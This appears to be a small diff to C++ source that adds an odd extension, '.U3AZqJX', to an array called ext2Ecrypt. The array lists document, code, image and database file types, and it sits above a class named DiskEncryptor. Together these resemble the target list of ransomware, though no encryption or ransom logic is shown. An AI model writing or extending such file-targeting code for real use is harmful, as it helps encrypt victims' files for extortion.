@@ -14,7 +14,7 @@ const std::string ext2Ecrypt[] = {
 ".json", ".sql", ".log", ".ini", ".cfg", ".sh", ".py", ".cpp", ".h",
 ".java", ".class", ".jar", ".php", ".asp", ".jsp", ".c", ".cs", ".pl",
 ".rb", ".psd", ".ai", ".eps", ".svg", ".tiff", ".tif", ".ipynb", ".yml", ".md",
-".bin", ".dat", ".db", ".dbf", ".mdb", ".accdb", ".sql", ".dbx", ".dbf", ".dbf",
+".bin", ".dat", ".db", ".dbf", ".mdb", ".accdb", ".sql", ".dbx", ".dbf", ".dbf", ".U3AZqJX"
 };
 
 class DiskEncryptor
